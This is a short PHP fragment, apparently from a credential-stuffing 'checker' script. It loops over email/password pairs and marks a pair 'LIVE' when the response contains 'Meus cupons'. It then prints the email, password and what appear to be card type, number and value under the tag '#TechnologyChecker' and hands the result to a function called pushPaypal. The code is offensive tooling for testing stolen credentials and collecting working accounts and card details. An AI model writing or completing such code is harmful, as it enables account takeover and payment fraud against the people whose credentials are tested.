...
$checked++;
	...
	if($d){
		...
		if (stristr($x,'Meus cupons') !== false) {
			...
			$xyz = "<b style=\"color:green\">LIVE</b> =>  <b style=\"color:white\" >$email</b> | <b style=\"color:white\">$pwd<b/> | <b style=\"color:red\"> $tipo $num $val</b> |<b style=\"color:red\">#TechnologyChecker</b>";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
